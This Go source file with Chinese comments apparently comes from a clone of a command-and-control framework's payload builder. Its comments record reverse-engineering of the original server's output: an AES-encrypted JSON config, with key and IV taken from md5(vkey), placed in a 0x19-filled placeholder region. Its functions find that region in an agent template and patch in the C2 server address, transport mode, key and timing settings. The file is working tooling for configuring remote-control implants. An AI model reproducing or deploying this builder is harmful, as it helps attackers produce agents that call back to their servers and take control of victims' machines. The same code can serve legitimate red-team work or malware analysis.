package c2engine

// 官方载荷的"配置区"编解码（R13 动态取证结论）。
//
// 结论来源：起一个独立的原版 4.9.3 实例（硬链，读自己的 conf），用 /download/listen
// 拉取真实产物，再与二进制里嵌入的模板逐字节对比。结果：
//
//  1. 模板里预留了一段 **20480 字节、全部填充 0x19** 的占位区；
//  2. 服务器下发时**原地覆盖**这段区域（不是追加 trailer）；
//  3. 区域布局：[16B IV][AES-128-CBC 密文]，且 **key == IV == md5(vkey) 的原始 16 字节**；
//  4. 明文是 JSON + 0x00 填充（无 PKCS#7），总长 20464；
//  5. JSON 字段：server/type/vkey/proxy/salt/l/e/d/h，其中
//     server = "host:port"，type = 传输模式（tcp/kcp/ws/dns/oss）。
//
// 同一组参数多次请求得到的字节完全一致（确定性），换 salt 只有 JSON 里
// 的 salt 字段变化（IV/密钥只依赖 vkey）。
//
// 复刻端现状：此前的实现是把 VSCF 配置块**追加**在文件末尾。为对齐官方产物，
// PoBuild 现在优先写官方格式的原地配置区；VSCF trailer 仅作为"自家 agent 读取"
// 的补充（见 config_block.go）。

import (
	"bytes"
	"crypto/aes"
	"crypto/md5"
	"crypto/cipher"
	"encoding/json"
	"errors"
	"fmt"
)

const (
	// AgentConfigRegionSize 是模板里 0x19 占位区的固定大小。
	AgentConfigRegionSize = 20480
	// AgentConfigPlainSize 是 JSON + 0 填充后的固定明文长度（区域减去 16 字节 IV）。
	AgentConfigPlainSize = AgentConfigRegionSize - 16
	// agentConfigFiller 是占位区的填充字节。
	agentConfigFiller = 0x19
)

// AgentWireConfig 是官方配置 JSON 的结构。
//
// 字段名必须与官方一致（全小写、无多余字段），否则 agent 解析失败。
type AgentWireConfig struct {
	Server string `json:"server"`
	Type   string `json:"type"`
	Vkey   string `json:"vkey"`
	Proxy  string `json:"proxy"`
	Salt   string `json:"salt"`
	// 以下四个字段语义已由 R13 的第二轮取证确认（对照组：listener 2，
	// PingInterval=7、DisconnectTimeout=99 → 产物里 d=99、h=7）：
	//   L = listen 模式（/download/listen 独立载荷为 true，stageless 为 false）
	//   D = DisconnectTimeout（断连超时，秒）
	//   H = PingInterval（心跳间隔，秒）
	//   E = 仍待定（两次取证均为 false）
	L bool `json:"l"`
	E bool `json:"e"`
	D int  `json:"d"`
	H int  `json:"h"`
}

// ErrNoConfigRegion 表示模板里没有找到 0x19 占位区。
var ErrNoConfigRegion = errors.New("template has no 0x19 config region")

// FindAgentConfigRegion 在模板里定位 0x19 占位区，返回起始偏移。
//
// 官方模板都带这段区域；定位用"连续 20480 个 0x19"，并且要求整段对齐填充，
// 避免误命中编译器生成的其它填充。
func FindAgentConfigRegion(template []byte) (int, error) {
	if len(template) < AgentConfigRegionSize {
		return 0, ErrNoConfigRegion
	}
	needle := bytes.Repeat([]byte{agentConfigFiller}, AgentConfigRegionSize)
	if idx := bytes.Index(template, needle); idx >= 0 {
		return idx, nil
	}
	return 0, ErrNoConfigRegion
}

// AgentConfigKey 返回官方用的密钥/IV：md5(vkey) 的原始 16 字节。
func AgentConfigKey(vkey string) []byte {
	sum := md5.Sum([]byte(vkey))
	return sum[:]
}

// EncodeAgentConfigRegion 生成 20480 字节的配置区（IV + AES-128-CBC 密文）。
func EncodeAgentConfigRegion(cfg AgentWireConfig) ([]byte, error) {
	plain, err := json.Marshal(cfg)
	if err != nil {
		return nil, err
	}
	if len(plain) > AgentConfigPlainSize {
		return nil, fmt.Errorf("config JSON too large: %d > %d", len(plain), AgentConfigPlainSize)
	}
	// 0x00 填充到固定长度（官方没有 PKCS#7，末尾是连续的 0）
	buf := make([]byte, AgentConfigPlainSize)
	copy(buf, plain)

	key := AgentConfigKey(cfg.Vkey)
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	out := make([]byte, AgentConfigRegionSize)
	// IV == key（官方如此），直接放在区域开头
	copy(out[:16], key)
	cipher.NewCBCEncrypter(block, key).CryptBlocks(out[16:], buf)
	return out, nil
}

// DecodeAgentConfigRegion 解出配置区（用于校验/测试）。
func DecodeAgentConfigRegion(region []byte, vkey string) (AgentWireConfig, error) {
	var cfg AgentWireConfig
	if len(region) != AgentConfigRegionSize {
		return cfg, fmt.Errorf("region size %d, want %d", len(region), AgentConfigRegionSize)
	}
	block, err := aes.NewCipher(AgentConfigKey(vkey))
	if err != nil {
		return cfg, err
	}
	buf := make([]byte, AgentConfigPlainSize)
	cipher.NewCBCDecrypter(block, region[:16]).CryptBlocks(buf, region[16:])
	buf = bytes.TrimRight(buf, "\x00")
	if err := json.Unmarshal(buf, &cfg); err != nil {
		return cfg, err
	}
	return cfg, nil
}

// PatchAgentConfig 把配置区原地写进模板（模板必须自带 0x19 占位区）。
//
// 返回写入的偏移，便于调用方记录/校验。
func PatchAgentConfig(template []byte, cfg AgentWireConfig) (int, error) {
	off, err := FindAgentConfigRegion(template)
	if err != nil {
		return 0, err
	}
	region, err := EncodeAgentConfigRegion(cfg)
	if err != nil {
		return 0, err
	}
	copy(template[off:off+AgentConfigRegionSize], region)
	return off, nil
}
